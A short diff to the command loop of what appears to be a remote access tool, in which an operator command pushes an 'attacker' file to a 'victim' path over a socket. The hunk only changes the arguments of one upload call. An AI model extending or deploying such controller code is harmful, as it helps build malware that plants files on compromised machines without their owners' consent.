@@ -176,7 +176,7 @@ def main_loop(client_socket):
 			# Usage: download <file_of_attacker> <path_of_victim>
 			client_socket.send(("upload " + cmd.split(" ", 2)[2]).encode())
 			transfer = FileTransfer(client_socket)
-			transfer.upload(cmd.split(" ")[1], cmd.split(" ")[2])
+			transfer.upload(cmd.split(" ")[1])
 		elif cmd == "exit":
 			return
 
